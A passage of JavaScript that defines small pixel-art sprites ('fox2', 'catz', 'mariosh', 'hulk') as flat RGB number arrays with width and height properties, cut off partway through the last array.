255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 0, 0, 0, 209, 99, 3, 255, 121, 4, 255, 255, 255, 255, 255, 255, 219, 215, 205, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 219, 215, 205, 219, 215, 205, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 255, 255, 255, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 219, 215, 205, 255, 255, 255, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 255, 255, 255, 255, 255, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 255, 255, 255, 255, 255, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 255, 255, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 209, 99, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 0, 0, 0, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 209, 99, 3, 255, 173, 65, 255, 121, 4, 209, 99, 3, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 209, 99, 3, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 209, 99, 3, 0, 0, 0, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 121, 4, 255, 121, 4, 209, 99, 3, 0, 0, 0, 209, 99, 3, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 209, 99, 3, 209, 99, 3, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 121, 4, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 219, 215, 205, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 209, 99, 3, 209, 99, 3, 219, 215, 205, 219, 215, 205, 255, 255, 255, 255, 255, 255, 219, 215, 205, 0, 0, 0, 219, 215, 205, 219, 215, 205, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 173, 65, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 219, 215, 205, 219, 215, 205, 219, 215, 205, 219, 215, 205, 219, 215, 205, 0, 0, 0, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 209, 99, 3, 209, 99, 3, 209, 99, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 219, 215, 205, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 0, 0, 0, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 219, 215, 205, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 209, 99, 3, 0, 0, 0, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 219, 215, 205, 219, 215, 205, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 173, 65, 255, 121, 4, 209, 99, 3, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 219, 215, 205, 219, 215, 205, 219, 215, 205, 0, 0, 0, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 209, 99, 3, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 219, 215, 205, 219, 215, 205, 0, 0, 0, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 209, 99, 3, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
fox2.width = 30;
fox2.height = 27;
var catz = [255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 255, 255, 252, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 252, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 133, 167, 129, 98, 78, 76, 255, 255, 252, 255, 255, 252, 255, 255, 252, 255, 255, 252, 98, 78, 76, 133, 156, 129, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 133, 167, 129, 1, 156, 10, 98, 78, 76, 98, 78, 76, 98, 78, 76, 98, 78, 76, 1, 156, 10, 78, 122, 95, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 1, 156, 10, 78, 122, 95, 133, 143, 65, 1, 156, 10, 1, 156, 10, 133, 143, 65, 1, 156, 10, 78, 122, 95, 78, 122, 95, 1, 156, 10, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 133, 143, 65, 255, 255, 255, 255, 255, 252, 98, 78, 76, 78, 122, 95, 78, 122, 95, 133, 167, 129, 78, 122, 95, 78, 122, 95, 133, 143, 65, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 133, 143, 65, 98, 78, 76, 98, 78, 76, 1, 156, 10, 78, 122, 95, 98, 78, 76, 98, 78, 76, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 98, 78, 76, 98, 78, 76, 78, 122, 95, 1, 156, 10, 98, 78, 76, 98, 78, 76, 98, 78, 76, 98, 78, 76, 255, 255, 252, 255, 255, 255, 255, 255, 255, 98, 78, 76, 133, 167, 129, 98, 78, 76, 0, 0, 0, 78, 122, 95, 78, 122, 95, 98, 78, 76, 98, 78, 76, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 98, 78, 76, 98, 78, 76, 78, 122, 95, 78, 122, 95, 1, 156, 10, 78, 122, 95, 1, 156, 10, 78, 122, 95, 98, 78, 76, 244, 250, 255, 255, 255, 255, 98, 78, 76, 133, 156, 129, 98, 78, 76, 0, 0, 0, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 98, 78, 76, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 1, 156, 10, 78, 122, 95, 1, 156, 10, 78, 122, 95, 133, 143, 65, 98, 78, 76, 98, 78, 76, 98, 78, 76, 1, 156, 10, 98, 78, 76, 0, 0, 0, 197, 190, 169, 197, 190, 169, 133, 167, 129, 78, 122, 95, 78, 122, 95, 98, 78, 76, 98, 78, 76, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 98, 78, 76, 78, 122, 95, 98, 78, 76, 255, 255, 255, 0, 0, 0, 78, 122, 95, 78, 122, 95, 133, 143, 65, 197, 160, 169, 197, 218, 169, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 197, 160, 169, 197, 143, 169, 78, 122, 95, 197, 143, 169, 221, 48, 99, 160, 34, 71, 78, 122, 95, 98, 78, 76, 78, 122, 95, 98, 78, 76, 255, 255, 255, 0, 0, 0, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 197, 143, 169, 78, 122, 95, 78, 122, 95, 197, 143, 169, 197, 143, 169, 78, 122, 95, 78, 122, 95, 197, 143, 169, 197, 160, 169, 78, 122, 95, 98, 78, 76, 255, 255, 255, 255, 255, 255, 0, 0, 0, 174, 37, 78, 221, 48, 99, 197, 160, 169, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 160, 34, 71, 197, 160, 169, 78, 122, 95, 78, 122, 95, 221, 48, 99, 197, 143, 169, 78, 122, 95, 78, 122, 95, 160, 34, 71, 78, 122, 95, 98, 78, 76, 255, 255, 255, 255, 255, 255, 0, 0, 0, 1, 156, 10, 78, 122, 95, 201, 37, 78, 221, 48, 99, 201, 37, 78, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 174, 37, 78, 221, 48, 99, 78, 122, 95, 78, 122, 95, 160, 34, 71, 197, 143, 169, 78, 122, 95, 78, 122, 95, 78, 122, 95, 98, 78, 76, 255, 255, 255, 255, 255, 255, 0, 0, 0, 1, 156, 10, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 160, 34, 71, 78, 122, 95, 78, 122, 95, 197, 143, 169, 78, 122, 95, 78, 122, 95, 78, 122, 95, 1, 156, 10, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 1, 156, 10, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 78, 122, 95, 1, 156, 10, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 1, 156, 10, 78, 122, 95, 1, 156, 10, 1, 156, 10, 78, 122, 95, 1, 156, 10, 78, 122, 95, 78, 122, 95, 78, 122, 95, 1, 156, 10, 78, 122, 95, 1, 156, 10, 1, 156, 10, 197, 143, 169, 1, 156, 10, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 78, 122, 95, 98, 78, 76, 98, 78, 76, 133, 156, 129, 98, 78, 76, 98, 78, 76, 98, 78, 76, 98, 78, 76, 98, 78, 76, 78, 122, 95, 98, 78, 76, 98, 78, 76, 160, 34, 71, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 98, 78, 76, 255, 255, 255, 255, 255, 255, 98, 78, 76, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 98, 78, 76, 98, 78, 76, 255, 255, 255, 255, 255, 255, 98, 78, 76, 98, 78, 76, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
catz.width = 23;
catz.height = 18;
var mariosh = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 105, 56, 2, 105, 56, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 105, 56, 2, 105, 56, 2, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 105, 56, 2, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 105, 56, 2, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 105, 56, 2, 105, 56, 2, 255, 255, 255, 0, 0, 0, 105, 56, 2, 105, 56, 2, 0, 0, 0, 255, 255, 255, 105, 56, 2, 105, 56, 2, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 255, 255, 255, 0, 0, 0, 105, 56, 2, 105, 56, 2, 0, 0, 0, 255, 255, 255, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 105, 56, 2, 105, 56, 2, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 105, 56, 2, 105, 56, 2, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 105, 56, 2, 255, 255, 255, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 105, 56, 2, 255, 255, 255, 105, 56, 2, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 65, 37, 1, 65, 37, 1, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 65, 37, 1, 65, 37, 1, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 255, 255, 255, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 255, 189, 24, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1, 65, 37, 1];
mariosh.width = 18;
mariosh.height = 16;
var hulk = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 101, 101, 105, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 101, 101, 105, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 101, 101, 105, 101, 101, 105, 101, 101, 105, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 101, 101, 105, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 101, 101, 105, 101, 101, 105, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 101, 101, 105, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 101, 101, 105, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 128, 11, 255, 128, 11, 255, 128, 11, 255, 128, 11, 255, 